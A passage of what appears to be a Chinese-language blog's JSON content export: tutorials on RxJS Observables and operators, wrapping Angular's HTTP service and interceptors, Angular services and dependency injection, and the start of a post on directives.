Method），把button标签的所有点击事件封装到一个Observable对象中，并转化为数据流的形式，最后通过subscribe()方法对整个点击事件流进行监听，即，当按钮被点击是，对应的Observable对象变发出一个相应的信息，这条信息被会subscribe()中的observer回调函数所捕获，从而执行console.log()语句，这样便实现了一个最简单的数据流监听。 使用RxJS处理复杂场景用JS原生的事件监听也可以完成上述例子，那么为什么还需要Observable、Operator等复杂的概念呢？ 以复杂例子说明，在实际开发中，经常有一个场景：当用户在一个文本输入框进行输入时，需要对用户的输入进行实时的监听，每当用户输入一些新字符时，便会发一个请求到服务器端，来获取一些推荐信息展示给用户，但实现这个功能的时候，可能还会有一些限制： 不必在每次用户输入的时候都发起请求，用户在文本框输入文字时，可能会输入的很快，这时是不需要给用户推荐任何信息的，不然频繁发生网络请求可能会带来性能问题，因此需要优化，每当用户输入停顿500ms且没有在输入时才返回推荐信息给用户。 要保证请求返回的顺序，在异步请求的情况下，由于服务器返回推荐数据的响应事件受各种因数影响，有时前端拿到的推荐数据不是最后依次请求，所以需要保证这些推荐信息的渲染顺序要与请求顺序一致。以上需求其实不难实现，通过原生JS监听和回调函数可以解决，但会有点复杂，在代码上需要新增各种各样的状态量，使得原本的逻辑变得冗余难读，同时这些状态量往往难以维护，久而久之就成了一些bug的源头。 在RxJS中，这样的数据流操作却可以非常优雅的实现：12345let inputSelector = document.querySelector('input');Rx.Observable.fromEvent(inputSelector, 'keyup') .decounceTime(500) .switchMap(event =&gt; getRecommend(event.target.value)) .subscribe(callback); 不用详细解释，仅仅看流程就知道，RxJS借鉴函数式编程的理念，把所有状态量的操作都封装在一个个Operator函数中，并且通过链式调用的方法对原始数据流进行了过滤等操作，使得代码变得容易阅读且方便维护。 RxJS和Promise对比RxJS的Observable可以通过toPromise()方法把原有的Observable对象转为Promise对象，那么RxJS和Promise究竟那个更好？其实，从上面的转换可以看出，Promise能用的场景RxJS都能用，RxJS是作为Promise的超集存在的。 先看看两种方式实例创建的简单代码：1234567891011121314151617// Promise实例的创建let promise = new Promise( (resolve, reject) =&gt; &#123; // ... if( /* 成功 */ )&#123; resolve(value); &#125;else&#123; reject(error); &#125;&#125; );// Observable实例的创建：let Observable = new Observable( observer =&gt; &#123; observer.next(value1); observer.next(value2); observer.error(err);&#125; ); 对比上面的代码可以发现，Promise只能针对单一的异步事件进行resolve()操作，而在Observable中，不仅能处理一个单一的异步事件（即调用observer的next()方法），而且能以流的形式响应多个异步事件。同时，Promise使用场景最多的all()、race()等方法，RxJS同样有对应的解决方案，对all()，RxJS通过forkJoin()方法实现，对于race()，RxJS通过merge()和take()来实现。12345// Promise中，all()方法用来合并请求，let newPromise = Promise.all(promiseReq1, promiseReq2);// Observable中，对应的forkJoin()方法合并请求let newObservable = Rx.Observable.forkJoin(obsReq1, obsReq2); “冷”模式下的Observable在Rx的理念中，Observable通常可以分成“热”（HOT）模式和“冷”（Cold）模式，在热模式下，Observable对象一旦创建，便会开始发送数据，而在冷模式下，Observable对象会一致等到自己被订阅才会开始数据流的发送。在RxJS中，Observable实现的是冷模式:123456789console.log('Observable的数据发送顺序为：');let obs = new Observable(observer =&gt; &#123; console.log('Observable start'); observer.next();&#125;)console.log('start');obs.subscribe(); 在RxJS中，observer.next();在Observable对象被订阅后才执行。 除了冷和热两种模式外，RxJS还存在另外一种被称为Connectable的模式，这种模式下的Observable对象不管有没有被订阅、都不会发送数据，除非ConnectableObservable实例的connect()方法被调用：12345678910111213console.log('ConnectableObservable的数据发送顺序为：');let obs = new Observable(observer =&gt; &#123; console.log('Observable start'); observer.complete();&#125;).publish(); // Observable对象被publish()方法转为Connectable模式console.log('start');obs.subscribe();console.log('after Observable has been subscribed');obs.connect(); RxJS中的OperatorRxJS中，Operator操作符分为几类： 创建操作符（Creation Operators） 变换操作符（Transformation Operators） 过滤操作符（Filtering Operators） 组合操作符（Combination Operators） 工具操作符（Utility Operators） 创建操作符RxJS中的创建操作符，例如Observable.formEvent()和new Observable()，Observable.create()接受一个工厂函数（该函数以observer作为参数传入）并返回一个新的Observable对象，这个对象最终被subscribe()方法所监听，每当observer的next()方法被调用时，subscribe()中的callback函数便能捕获到observer传来的数据并进行相应的处理，这样便实现了对数据流的订阅和监听功能。12345678910let observable = Rx.Observable.create(observer =&gt; &#123; getData(data =&gt; &#123; observer.next(data); observer.complete(); &#125;)&#125;);observable.subscribe(data =&gt; &#123; // doSomething(data);&#125;); 变换操作符有时，通过Observable对象获取到的数据需要做一些批量的小调整，比如数据接口经常会有自己的一套规范包裹数据：1234&#123; \"err_code\": 0, \"data\":&#123;\"name\": \"Operators\"&#125;&#125; 只有数据中的data字段是实际想要处理的，所以需要对每一个请求做依次变换操作，把原本的数据流变换成需要的数据流，这就需要用到RxJS的变换操作符。RxJS最常用的变换操作是Observable.prototype.map()：12345observable.map(response =&gt; &#123; return response.data;&#125;).subscribe(data =&gt; &#123; // ...&#125;) 当observable拿到响应数据response并传递给observer之前，可以通过map操作预先对response进行处理。 过滤操作符过滤操作符可以用来过滤掉数据流中一些不需要处理的数据，例如，前端获取数据时，接口会因为各种原因无法返回最终需要的数据，可能是异常导致数据为空，或只返回一个错误代码以及错误描述，但是并不需要处理这些错误信息，所以就需要过滤掉这些数据（实际情况也有可能需要对错误进行提示等），这时，就可以用Observable.prototype.filter()来对数据流进行过滤。12345678observable.filter(response =&gt; &#123; return !!response.data &amp;&amp; response.status === 200; // 结果为false的数据不会再流向下一个operator，即下面的map&#125;).map(response =&gt; &#123; return response.data;&#125;).subscribe(data =&gt; &#123; // ...&#125;) 组合操作符每个接口都可以转换为相应的数据流，很多业务场景需要依赖两个甚至更多的接口数据，并且需要在这些接口数据都成功获取后，再进行关联合并。要满足这样的场景，就需要各个数据流汇合组成新的数据流，这时候就需要用到组合操作符，常用的是Observable.forkJoin()方法。1234567891011121314151617let getFirstDatObs = Rx.Observable.create(observer =&gt; &#123; observer.next(getFirstData()); observer.complet();&#125;);let getSecondDatObs = Rx.Observable.create(observer =&gt; &#123; observer.next(getSecondData()); observer.complet();&#125;);let observable = Rx.Observable.forkJoin(getFirstDataObs, getSecondDataObs);observable.subscribe(datas =&gt; &#123; // datas[0] 是getFirstDatObs的数据 // datas[1] 是getSecondDatObs的数据 // doSomething(datas)....&#125;) Observable.forkJoin()方法把原本两个相互独立的Observable对象合并成一个新的Observable对象，它会在两个Observable对象的数据都抵达后才开始合并处理，且doSomething(datas)只会执行一次。datas数组包含两个数据流。 注意：Observable.forkJoin()是静态函数，不是实例函数（Observable.prototype.forkJoin()）。部分操作符只有实例函数版本而没有静态函数版本，而有一些同时存在两个版本的操作符方法的效果一般是一样的。 若某次数据请求需要依赖前一次请求的结果，也就是说两次请求必须有先后顺序的，这时可以使用Observable.prototype.concatMap()。12345678910111213141516171819let getFirstDatObs = Rx.Observable.create(observer =&gt; &#123; observer.next(getFirstData()); observer.complet();&#125;);let createSecondDataObs = function(firstData)&#123; return Rx.Observable.create(observer =&gt; &#123; getSecondData(firstData, secondData =&gt; &#123; observer.next(secondData); observer.complet(); &#125;); &#125;);&#125;let observable = getFirstDataObs.concatMap(firstData =&gt; &#123; return createSecondDataObs(firstData);&#125;).subscribe(secondData =&gt; &#123; // ...&#125;); 通过Observable.prototype.concatMap()方法，getSecondData()的数据流会紧接在getFirstDatObs()的数据流后，并最终被subscribe()所捕获。 工具操作符Observable.prototype中还有很多有用的方法，统称为工具操作符，比如Observable.prototype.delay()或Observable.prototype.timeout()等。当需要给某个请求设置timeout时，就会用到这些timeout方法：12345prevObservable.timeout(5000).subscribe(data =&gt; &#123; // ...&#125;, err =&gt; &#123; // 超时抛出错误 handleErr(err);&#125;); Angular中的RxJS在Angular中，RxJS的使用非常频繁，例如：HTTP服务中的get/post/request等方法就返回Observable对象，以及路由中events，params等也都是Observable对象。 以如下两个场景为例，学习如何在Angular中使用RxJS。 改造HTTP服务在开发复杂项目时，有时会觉得原来的HTTP服务不够强大，比如没有统一错误处理、没有统一回调捕获（Callback Capture），为了实现这点，需要对现有的HTTP服务进行该着，把一些统一的全局处理封装在自己实现的HTTP服务器里面，改造封装后的HTTP服务需要实现如下功能： 对请求结果进行统一的预处理 对捕获到的错误统一报错 在HTTP请求发起时，开启加载动画 在HTTP请求发起时，关闭加载动画 对现有HTTP服务的在封装重写不应该修改原有的HTTP服务的方法，包括函数签名和返回的数据类型，所以不论是get、post、update还是delete方法都需要返回一个可以被订阅的Observable对象：1234567891011121314151617181920212223242526272829303132333435import &#123; Injectable &#125; from '@angular/core';import &#123; Http, RequestOptions, Headers &#125; from '@angular/http';import &#123; Observable &#125; from 'rxjs/Rx';// ...@Injectable()export class MyHttpService&#123; constructor(private http: Http)&#123;&#125; // 对于get()方法，统一调用request()方法发送请求 get(url: string, reqOpts?: RequestOptions)&#123; return this.request(url, Object.assign(&#123; method: 'get' &#125;, reqOpts)); &#125; // post、delete、update等方法的实现与get()方法类似 // ... // get、post、update、delete方法的统一封装 request(url: string, reqOpts: RequestOptions)&#123; // ... this.showLoading(); // 开启加载动画 return this.http.request(url, new RequestOptions(reqOpts)) .map(res =&gt; res.join()) .do(this.hideLoading().bind(this)) // 关闭加载动画 .map(this.preprocessRes.bind(this)) // 对返回数据统一预处理 .catch(this.handleErr.bind(this)); // 对请求错误统一处理 &#125; private preprocessRes(res)&#123; // ... return res.data; &#125;&#125; get、post、update、delete方法统一对request()方法进行调用，并且会通过request方法返回统一的Observable对象，这样，业务需求以及核心代码便被封装在request方法中。 输入提示功能实现一个较为完善的输入提示功能，需要完成如下需求： 不必在每次用户输入的时候都发起请求 发请求前检查内容，若输入内容相同，不发送请求 要保证请求返回的顺序 伪代码如下：12345678910111213141516171819202122232425// ...@Component(&#123; selector: 'demo-input', tempalte: ` &lt;input type=\"text\" [ngFormControl]=\"term\" /&gt; &lt;ul&gt; &lt;li *ngFor=\"let recommend of recommends\"&gt;&#123;&#123; recommend &#125;&#125;&lt;/li&gt; &lt;/ul&gt; `, providers: [DemoService]&#125;)export class DemoInputComponent implements OnInit &#123; recommends: Array&lt;string&gt;; term = new Control(); constructor(private _demoService: DemoService)&#123;&#125; ngOnInit()&#123; this.term.valueChanges .debounceTime(500) // 延迟500ms .distinctUntilChanged() // 输入值没变化则不发送请求 .switchMap(term =&gt; this._demoService.getRecommend(term)) // 保证请求顺序 .subscribe(term =&gt; this.items = items); &#125;&#125; 上述代码中，this.term.valueChanges是一个Observable对象，在其与subscribe()方法之间添加了debounceTime、distinctUntilChanged、switchMap三个RxJS内置的Operators。 debounceTime过滤掉所有Observable对象抛出的时间间隔不超过500ms的事件 distinctUntilChanged过滤掉所有Observable对象连续抛出的value值相同的事件 switchMap，其接收另一个Observable对象，即this._demoService.getRecommend(term),并把每一个valueChanges抛出的事件映射成一个新的Observable对象，再把这些新的单一的Observable对象合并整理成一个新的Observable对象。当上游的数据流有新的数据变更时，switchMap参数里生成的新数据流会被截断，不再往下传递数据。即不用担心AJAX返回的过时数据往下流动，从而保证输出结果始终保证跟输入框的值保持一致。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"},{"name":"rxjs","slug":"rxjs","permalink":"https://github.com/xmoyKING/tags/rxjs/"}]},{"title":"Angular2入门-服务","slug":"angular8","date":"2017-10-15T09:04:58.000Z","updated":"2017-12-06T14:50:08.836Z","comments":true,"path":"2017/10/15/angular8/","link":"","permalink":"https://github.com/xmoyKING/2017/10/15/angular8/","excerpt":"","text":"在Angular中，服务用于书写可重用的公共功能（如日志处理、权限管理等）和复杂业务逻辑、对应应用程序的模块化有着很重要的意义。 介绍Angular服务的概念，优点、以及如何创建和使用服务，然后介绍内置服务HTTP服务，HTTP服务是基于RxJS异步库（基于响应式编程范式实现）编写的。 Angular服务Angular服务一般封装了某种特定功能的独立模块，它可以通过注入的方式供外部调用，服务在Angular中使用非常广泛，比如： 多个组件中出现重复代码时，把重复代码提取到服务中实现代码复用 当组件中参杂了大量的业务代码和数据处理逻辑时，把这些逻辑封装成服务供组件使用，组件只负责UI相关的逻辑，有利于后续的更新和维护 把需要共享的数据存储在服务中，通过在多个组件中注入同一服务实例实现数据共享 常用的Angular服务为： 和服务器通讯的数据服务 检查用户输入的验证服务 方便跟踪错误的日志服务 使用场景通过2个示例学习Angular服务在业务逻辑封装和服务实例共享两种场景的使用。 业务逻辑封装结合通讯录例子中编辑联系人的功能来说明如何编写一个服务。一般编辑联系人需要的步骤如下： 从服务器拉去联系人信息 验证用户修改的数据 把修改后的数据提交到服务器 虽然可以把所有代码都写在组件里，但这样做会使组件的代码量非常大且杂乱，不利于后续代码维护。所以，最好从服务器拉去联系人信息和提交数据到服务器的代码封装到ContactService的类中。12345678910111213141516// contact.service.tsimport &#123; Injectable &#125; from '@angular/core';//...@Injectable()export class ContactService&#123; // 从服务器拉去联系人信息 getContactData()&#123; //... &#125; // 提交数据到服务器 updateContacts(contact: Contact)&#123; //... &#125;&#125; @Injectable()装饰器用于说明被装饰的类依赖了其他服务，而这里ContactService没有依赖其他服务，所以@Injetable()是可以省略的，但Angular官方推荐无论是否有依赖其他服务，都使用@Injectable()来装饰服务，因为添加@Injectable()装饰器有利于提高代码的可读性、一致性、减少异常发生。 通讯录例子的EditComponent组件中，通过依赖注入使用ContactService服务，需要先将ContactService服务通过import导入，再在组件的构造函数中引入服务的实例，接着就可以在逻辑代码中调用服务的方法了。123456789101112131415import &#123; Component, OnInit, Input &#125; from '@angular/core';import &#123; ContactService &#125; from 'shared/contact.service';@Component(&#123; selector: 'my-operate', templateUrl: 'app/edit/edit.component.html', styleUrls: ['app/edit/edit.component.css']&#125;)export class EditComponent implements OnInit &#123; constructor( // ... private _contactService: ContactService, )&#123;&#125; // ...&#125; 此处没有在@Component的providers元数据上显示声明ContactService服务，是因为通讯录例子的服务是采用模块注入的方式，在模块中注入服务，该模块下所有的组件都共享服务。 共享服务示例实际开发中，通常需要在多个组件之间进行通信，这种情况下除了组件通信的一些常用方法（父子组件间的输入输出属性、自定义事件、局部变量），还可以通过在组件间共享同一服务实例来实现通信。 以可在组件间共享数据的服务SharedService为例：12345678910// shared.service.tsimport &#123; Injectable &#125; from '@angular/core';@Injectable()export class SharedService&#123; list: string[] = []; append(str: string)&#123; this.list.push(str); &#125;&#125; 该服务包含一个list数组对象和append()方法，组件可以调用该服务的append方法向list数组中添加数据。使用时以父子组件为例，子组件ChildComponent接收用户输入并调用SharedService的append方法添加数据，父组件ParentComponent把SharedService的数据变化实时展示到模板中。12345678910111213141516171819202122// parent.component.tsimport &#123; Component &#125; from '@angular/core';import &#123; SharedService &#125; from './shared.service';import &#123; ChildComponent &#125; from './child.component';@Component(&#123; selector: 'parent-component', template: ` &lt;ul *ngFor=\"#item in list\"&gt; &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;child-component&gt;&lt;/child-component&gt; `, providers: [SharedService]&#125;)export class ParentComponent &#123; list: string[] = []; constructor(private _sharedService: SharedService)&#123;&#125; ngOnInit(): any &#123; this.list = this._sharedService.list; &#125;&#125; 为了父子组件都能获取到SharedService的同一个实例，需要在父组件中添加providers: [SharedService]，子组件不需要重复添加，否则父子组件获得的SharedService实例不是同一个。当然，也可以在父子组件所属的模块中统一配置providers: [SharedService]，那么父组件就不要配置了。1234567891011121314151617181920// child.component.tsimport &#123; Component &#125; from '@angular/core';import &#123; SharedService &#125; from './shared.service';@Component(&#123; selector: 'child-component', template: ` &lt;input type=\"text\" [(ngModel)]=\"inputText\" /&gt; &lt;button (click)=\"add()\"&gt;添加&lt;/button&gt; `, providers: [SharedService]&#125;)export class ChildComponent &#123; inputText: string = 'Testing data'; constructor(private _sharedService: SharedService)&#123;&#125; add() &#123; this._sharedService.append(this.inputText); this.inputText = ''; &#125;&#125; 父子组件中注入同一个服务实例是实现的关键，也是层级注入的一个应用场景。 HTTP服务HTTP服务是Angular中使用HTTP协议与远程服务器进行通讯的一个独立模块。在Angular应用中使用HTTP服务只需要3个简单步骤： 在模块装饰器@NgModule中导入HttpModule 在组件模块中导入HTTP服务 在组件的构造函数中声明引入 注：上面的SharedService服务是通过@Component的providers属性（元数据）注入到组件中（即在组件中注入服务），而HTTP服务则是通过导入HttpModule注入到模块中（即在模块中注入服务）。这两种方式注入，服务都能被组件正常使用，但形成的作用域返回不同。 调用HTTP服务的一个例子：123456789101112// app.module.tsimport &#123; HttpModule &#125; from '@angular/http';// ...@NgModule(&#123; imports: [ HttpModule // 1.在NgModule中导入HttpModule ], // ... bootstrap: [AppComponent]&#125;)export class AppModule&#123;&#125; 然后在组件中引入HTTP服务后，就可以用AJAX和JSONP两种方式发送数据请求了。1234567891011121314//contact.component.tsimport &#123; Component &#125; from '@angular/core';import &#123; bootstrap &#125; from '@angular/platform-browser/browser';import &#123; Http &#125; from '@angular/http'; // 2.导入HTTP服务@Component(&#123; selector: 'contact', template: `&lt;div&gt;Http Service!&lt;/div&gt;`&#125;)export class ContactComponent &#123; constructor(http: Http)&#123; // 3.声明引入 // ... &#125;&#125; AJAXAJAX是使用XMLHttpRequest对象向服务器发送请求并处理响应的通信技术，支持异步和同步2种方式。 一般来说使用异步方式，有3种方式处理异步操作：回调函数回调函数是最基本的异步操作方式，通过将函数A作为另一个函数B的行参，在B中调用函数A以此实现回调。这种方式简单好理解，但容易照成冗长的回调链（多层嵌套）问题，不利于代码维护。 使用PromisePromise给异步操作提供了统一的接口，使得程序具备正常的同步运行流程，回调函数也不必层层嵌套，最终代码易于理解，可维护强。如下例使用Promise的方式：12345// Promise写法(new Promise(function(resolve, reject)&#123;&#125;)) .then(funcA) .then(funcB) .then(funcC); 使用ObservableAngular推荐使用Observable处理异步操作，HTTP服务的API接口返回的也是Observable对象。 Observable是响应式编程模型Rx的核心概念，Rx的全称是Reactive Extensions，是微软开发的一套响应式编程模型，RxJS是它的JS版本，Angular对RxJS做了封装处理，使得在Angular开发中更易用。 以通讯录获取远程联系人信息的数据为例(HTTP GET请求)：123456789101112import &#123; NgModule &#125; from '@angular/core';import &#123; HttpModule &#125; from '@angular/http';import &#123; AppComponent &#125; from './app.component';@NgModule(&#123; imports: [ HttpModule ], declarations: [AppComponent], bootstrap: [AppComponent]&#125;)export class AppModule&#123;&#125; 下面的数据服务以查找联系人为例：1234567891011121314151617181920212223242526272829// contact.service.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; Http &#125; from '@angular/http';import &#123; Observable &#125; from 'rxjs/Rx';const CONTACT_URL = `./app/contacts.json`;@Injectable()export class ContactService&#123; constructor(private _http: http)&#123;&#125; getContacts(): Observable&lt;any[]&gt; &#123; return this._http.get(CONTACT_URL) .map(this.extractData) .catch(this.handleError); &#125; private extractData(res: Response) &#123; let body = res.json(); return body.data || &#123;&#125;; &#125; private handleError(error: any)&#123; let errMsg = (error.message) ? error.message : error.status ? `$&#123;error.status&#125; - $&#123;error.statusText&#125;` : `Server error`; console.error(errMsg); // 打印 return Observable.throw(errMsg); &#125;&#125; _http.get()返回一个Observable对象，而map()方法是它的常用操作之一，在extractData()方法里需要通过json()方法把服务器返回的数据转换成JSON对象。 不建议在getContacts()方法直接返回Response对象，数据服务应该对使用者隐藏实现细节，使用者只需要调用数据服务的接口取得数据，并不需要关系数据是如何获得以及是何种数据格式。 最后处理异常情况，任何I/O操作都可能发生错误（如网络错误），所以在数据服务里做好异常处理非常必要，通过catch操作捕捉错误并答应，然后使用Observable.throw()方法重新返回一个包含错误信息的Observable对象。 在组件中使用ContactService服务：123456789101112131415161718192021// contact.component.tsimport &#123; Component &#125; from '@angular/core';import &#123; ContactService &#125; from 'shared/contact.service.ts';@Component(&#123; // ...&#125;)export class ContactComponent &#123; // ... constructor( private _contactService: ContactService )&#123;&#125; getContacts()&#123; return this._contactService.getContacts() .subscribe( contacts =&gt; this.contacts = contacts, error =&gt; this.errorMessage = &lt;any&gt;error ); &#125;&#125; 需注意：在ContactComponent的getContacts()方法中，_http.get()并没有发出请求，因为RxJS中的Observable实现的是“冷”模式，只有当它被getContacts().subscribe订阅之后才会发出请求。 为通讯录示例增加添加/编辑联系人的功能(HTTP POST)。服务端的接口符合REST规范，添加联系人和拉取联系人的URL路径一样，至少METHOD不同，添加/编辑使用POST方法，并且在请求体中新增Contact对象的联系人数据。 服务端的接口在接收到数据并验证通过后会生成唯一id并保存到数据库中，然后以JSON格式放回带id的新联系人数据。因为要发起POST请求，并且在请求体中传递JSON数据，所以要设置HTTP请求头Content-Type为’application/json’。 首先导入Headers和RequestOptions对象：1import &#123; Headers, RequestOptions &#125; from '@angular/http'; 然后在ContactService服务中新增一个addContact()方法：123456789101112// contact.service.ts// ...addContact(contact: Contact): Observable&lt;Contact&gt; &#123; let body = JSON.stringify(contact); let headers = new Headers(&#123;'Content-Type': 'application/json'&#125;); let options = new RequestOptions(&#123;headers: headers&#125;); return this._http.post(CONTACT_URL, body, options) .map(this.extractData) .catch(this.handleError);&#125;// ... Headers是RequestOptions的一个属性，RequestOptions作为第三个参数传递给HTTP服务的post()方法，这样就可达到自定义请求头的目的。即使Content-Type已经被指定为JSON类型，但服务端仍然只接收字符串，所以请求前需要将对象转换为JSON字符串。 在组件中使用addContact()方法和使用getContact方法一样：1234567891011// list.component.ts// ...addContact(contact: Contact)&#123; if(!contact) return; this._contactService.addContact(contact) .subscribe( contact =&gt; this.contacts.push(contact), error =&gt; this.errorMessage = &lt;any&gt;error );&#125; 在组件的addContact()方法中订阅ContactService中addContact()方法返回的Observable实例，请求返回时会把新联系人数据追加到contacts数组，然后Angular渲染更新展示。 另外HTTP服务返回的Observable对象可以方便的转换成Promise对象，以下为ContactService服务的Promise版本：12345678910111213141516171819202122232425262728293031// Promise版本// contact.service.ts import &#123; Injectable &#125; from '@angular/core';import &#123; Http, RequestOptions &#125; from '@angular/http';import &#123; Promise &#125; from 'rxjs/Rx';const CONTACT_URL = `./app/contacts.json`;@Injectable()export class ContactService&#123; constructor(private _http: http)&#123;&#125; getContacts(): Promise&lt;any[]&gt; &#123; return this._http.get(CONTACT_URL) .toPromise() .then(this.extractData) .catch(this.handleError); &#125; private extractData(res: Response) &#123; let body = res.json(); return body.data || &#123;&#125;; &#125; private handleError(error: any)&#123; let errMsg = (error.message) ? error.message : error.status ? `$&#123;error.status&#125; - $&#123;error.statusText&#125;` : `Server error`; console.error(errMsg); // 打印 return Promise.reject(errMsg); &#125;&#125; JSONP这一技术的起因在浏览器同源策略的访问限制。关于同源策略不细讲，只谈解决方法。若服务器和浏览器都支持CORS（Cross-Origin Resource Sharing）协议，则AJAX不受同源策略的限制。CORS是W3C的标准。若两端不方便实施CORS，则可以选择JSONP方案，它适用于任何浏览器。 因为script标签请求资源不会受同源策略限制，而JSONP就是利用script的特性来绕过同源策略，使用JSONP的关键在于利用script标签来发起GET请求，这个请求中传递callback参数给服务端，然后服务端返回一段JS代码，一般以callback函数包裹着JSON数据的形式返回，当script标签请求完成后会自动执行这段代码，所以可以在预先定义好的全局方法callbak中接收和处理JSON数据，注意JSONP只能发起GET请求，在需要发起POST请求的场景中并不适用。 HTTP服务中包含了JSONP服务，示例如下：1234567891011121314151617181920212223// contact.service.ts import &#123; Injectable &#125; from '@angular/core';import &#123; Jsonp, URLSearchParams &#125; from '@angular/http';@Injectable()export class ContactService&#123; constructor(private _jsonp: Jsonp)&#123;&#125; getContacts() &#123; let URL = 'http://xxx.host.com/contacts'; let params = new URLSearchParams(); params.set('format', 'json'); params.set('callback', 'JSONP_CALLBACK'); return this._jsonp .get(URL, &#123;search: params&#125;) .map(res =&gt; res.json()) .subscribe( contacts =&gt; this.contacts = contacts, error =&gt; this.errorMessage = &lt;any&gt;error ); &#125;&#125; HttpModuleHttpModule是在@angular/http中定义的用于封装HTTP相关功能的模块，它包含了HTTP服务，同时也包含HTTP所依赖的其他服务，HttpModule模块主要包含服务如下： HTTP: 封装了常用的HTTP请求方法 BrowserXhr：用于创建XMLHTTPRequest实例的工厂 XHRBackend：用于创建了XHRConnection实例，该实例会使用BrowserXhr对象来处理请求 XSRFStrategy：接口，它定义了配置XSRF攻击保护的方式，目前Angular提供了CookieXSRFStrategy类帮助设置Request Header，用于防止XSRF攻击 RequestOptions：封装了HTTP请求参数，BaseRequestOptions是它的子类，默认将请求设置为GET方式 ResponseOptions：封装了HTTP响应参数，BaseResponseOptions是它的子类，默认将响应设置为成功以上服务为Angular默认提供的服务，实际开发用的较多的是HTTP服务，其他服务较少。 开发时，一般会对所有请求做统一处理，例如添加一些必要的HTTP自定义请求头域，或在后端返回某个错误时进行统一处理，如401错误码，或者统一在请求发出前显示“加载中”的状态并在请求返回后关闭该状态等。这种情况下，就可以通过实现ConnectionBackend类并重写createConnection()方法来实现。 首先编写一个HttpInterceptor服务，对请求发送前后进行处理：123456789101112131415161718192021// http-interceptor.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; Request, Response &#125; from '@angular/http';import &#123; Observable &#125; from 'rxjs';@Injectable()export class HttpInterceptor&#123; beforeRequest(request: Request): Request &#123; // 请求发出前的处理逻辑 console.log(request); return request; &#125; afterResponse(res: Observable&lt;Response&gt;):Observable&lt;any&gt; &#123; // 请求响应后的处理逻辑 res.subscribe((data)=&gt;&#123; console.log(data); &#125;); return res; &#125;&#125; 接着实现ConnectionBackend抽象类，目的是封装XHRBackend服务，在XHRBackend创建XHRConnection实例前后进行相应的逻辑处理：12345678910111213141516171819202122232425// http-interceptor-backend.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; ConnectionBackend, XHRConnection, XHRBackend, Request &#125; from '@angular/http';import &#123; HttpInterceptor &#125; from './http-interceptor';@Injectable()export class HttpInterceptorBackend implements ConnectionBackend &#123; constructor( private _httpInterceptor: HttpInterceptor, private _xhrBackend: XHRBackend )&#123;&#125; createConnection(request: Request): XHRConnection &#123; let interceptor = this._httpInterceptor; // 请求发出前，拦截请求并调用HttpInterceptor对象的beforeRequest()方法 let req = interceptor.beforeRequest ? interceptor.beforeRequest(request) : request; // 通过XHRBackend对象创建XHRConnection实例 let result = this._xhrBackend.createConnection(req); // 在得到响应后，拦截并调用HttpInterceptor对象的afterResponse方法 result.response = interceptor.afterResponse ? interceptor.afterResponse(result.response) : result.response; return result; &#125;&#125; Angular的HttpModule源码中，HTTP服务默认是使用XHRBackend对象作为构造函数的第一个参数创建的，为了使HttpInterceptorBackend拦截生效，需要将创建HTTP服务时的第一个参数改为HttpInterceptorBackend对象，因此定义一个新的httpFactory工厂方法：123456// HttpModule源码// ...export function httpFactory(xhrBackend: XHRBackend, requestOptions: RequestOptions): HTTP &#123; return new Http(xhrBackend, requestOptions);&#125;// ... 对应HttpModule源码，重写httpFactory方法1234567// http-factory.tsimport &#123; RequestOptions, Http &#125; from '@angular/http';import &#123; HttpInterceptorBackend &#125; from './http-interceptor-backend';export function httpFactory(httpInterceptorBackend: HttpInterceptorBackend, requestOptions: RequestOptions): HTTP &#123; return new Http(httpInterceptorBackend, requestOptions);&#125; 最后在根模块中导入以上定义的服务即可：1234567891011121314151617// app.module.tsimport &#123; Http, RequestOptions &#125; from '@angular/http';import &#123; HttpInterceptorBackend &#125; from './interceptor/http-interceptor-backend';import &#123; HttpInterceptor &#125; from './interceptor/http-interceptor';import &#123; httpFactory &#125; from './interceptor/http-factory';// ... providers: [ // ... HttpInterceptorBackend, HttpInterceptor, &#123; provide: Http, useFactory: httpFactory, deps: [HttpInterceptorBackend, RequestOptions] &#125; ]// ... 如此之后，通过HTTP服务发出任何一个HTTP请求时，在控制台都能打印出Request对象和Response对象。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-指令","slug":"angular7","date":"2017-10-11T03:30:06.000Z","updated":"2017-12-06T14:50:08.821Z","comments":true,"path":"2017/10/11/angular7/","link":"","permalink":"https://github.com/xmoyKING/2017/10/11/angular7/","excerpt":"","text":"在Angular中，指令是一个重要的概念，它作用在特定的DOM元素上，可以扩展这个元素的功能，为元素增加新的行为。本质上，组件可以被理解为一种带有视图的指令，组件继承自指令，是指令的一个子类，通常被用来构造UI控件。 指令概览Angular中指令的使用方式与HTML元素中属性的使用方式相似，不同的是，HTML语法标准为HTML元素预定了特定的属性，浏览器遵循标准实现了这些属性的内置行为。语法标准预定义的属性是有限的、不可扩展的，而Angular的指令是可自定义的，可任意扩展的，这在一定程度上弥补了标准HTML元素属性功能的不足。 指令分类在Angular中包含三种类型的指令： 属性指令属性指令，是以元素属性的形式来使用的指令，与HTML元素内置属性不同，指令是Angular对HTML元素属性的扩展，浏览器本身不能识别这种指令，指令仅在Angular环境中才能被识别使用，属性指令通常被用来改变元素的外观和行为，如Angular的内置指令NgStyle，它可以基于组件的状态来动态设置目标元素的样式。 结构指令结构指令可以用来改变DOM树的结构，指令可以根据模板表达式的值，增加或删除DOM元素，从而改变DOM的布局，与属性指令的使用方式相同，都是以元素属性的形式来使用，两者的区别在于使用场景的不同，属性指令用来改变元素的外观和行为，而结构指令用来改变DOM树的结构。 如Angular内置结构指令NgIf，使用NgIf指令需要为指令绑定一个表达式，表达式值为true时，该DOM元素及其子元素被添加至DOM中，表达式值为false时，元素从DOM中被移除。 